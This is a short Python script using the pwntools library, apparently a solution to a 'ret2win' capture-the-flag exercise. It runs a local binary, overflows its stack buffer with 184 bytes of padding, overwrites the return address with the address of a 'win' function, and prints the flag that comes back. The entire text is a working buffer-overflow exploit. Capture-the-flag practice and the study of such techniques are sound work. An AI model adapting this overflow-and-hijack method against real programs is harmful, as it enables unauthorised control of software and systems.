import sys
from pwn import *
context.log_level = 'warning'
binary = './bin-ret2win-0'
e = ELF(binary)
p = process(binary)
buf = b'A'*(176+8)
p.sendline(buf + p64(e.sym['win']))
p.recvuntil(b'flag{')
print('flag{' + p.recvuntil(b'}').decode('utf-8'))
